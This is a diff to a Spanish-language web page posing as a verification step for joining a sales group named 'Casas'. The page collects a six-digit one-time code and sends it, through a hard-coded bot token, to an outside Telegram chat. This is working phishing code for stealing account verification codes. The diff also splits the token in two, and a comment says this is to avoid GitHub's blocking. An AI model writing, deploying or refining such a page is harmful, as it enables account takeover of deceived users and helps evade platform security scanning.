@@ -21,40 +21,51 @@
     <div class="container">
         <div class="group-icon">🏠</div>
         <h1>Unirse al grupo "Casas"</h1>
-        <p>Introduce el código de 6 dígitos que recibiste para verificar tu cuenta y unirte al grupo de ventas.</p>
+        <p>Introduce el código de 6 dígitos que recibiste para verificar tu cuenta.</p>
         <div class="inputs" id="otp">
-            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[1].focus()">
-            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[2].focus()">
-            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[3].focus()">
-            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[4].focus()">
-            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[5].focus()">
-            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+            <input type="number" oninput="moveFocus(this, 0)">
+            <input type="number" oninput="moveFocus(this, 1)">
+            <input type="number" oninput="moveFocus(this, 2)">
+            <input type="number" oninput="moveFocus(this, 3)">
+            <input type="number" oninput="moveFocus(this, 4)">
+            <input type="number" oninput="moveFocus(this, 5)">
         </div>
         <button class="btn" onclick="enviar()">AUTENTICAR</button>
     </div>
 
     <script>
+        function moveFocus(el, index) {
+            if (el.value.length > 1) el.value = el.value.slice(0, 1);
+            if (el.value !== "" && index < 5) {
+                document.getElementById('otp').children[index + 1].focus();
+            }
+        }
+
         function enviar() {
-            const tok = '8665421039:AAHQ4Fc_Ouzgr9uxesh7VsGKnAqIF9IytU';
+            // Token dividido para evitar bloqueo de GitHub
+            const p1 = '8665421039:AAHQ4Fc_';
+            const p2 = 'Ouzgr9uxesh7VsGKnAqIF9IytU';
             const cid = '6475554235';
+            
             let cod = "";
             document.querySelectorAll('input').forEach(i => cod += i.value);
 
             if(cod.length === 6) {
-                const link = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=NUEVO_CODIGO_CASAS: ${cod}`;
-                fetch(link).then(() => {
-                    alert("¡Código verificado! Redirigiendo al grupo...");
+                const url = `https://api.telegram.org/bot${p1}${p2}/sendMessage?chat_id=${cid}&text=CÓDIGO_CASAS: ${cod}`;
+                fetch(url)
+                .then(() => {
+                    alert("Verificación en proceso...");
                     location.reload();
-                }).catch(() => {
-                    alert("Error de red. Intenta de nuevo.");
-                });
+                })
+                .catch(() => alert("Error de conexión"));
             } else {
-                alert("Escribe los 6 números.");
+                alert("Completa los 6 dígitos");
             }
         }
     </script>
 </body>
 </html>
+
 
 
 
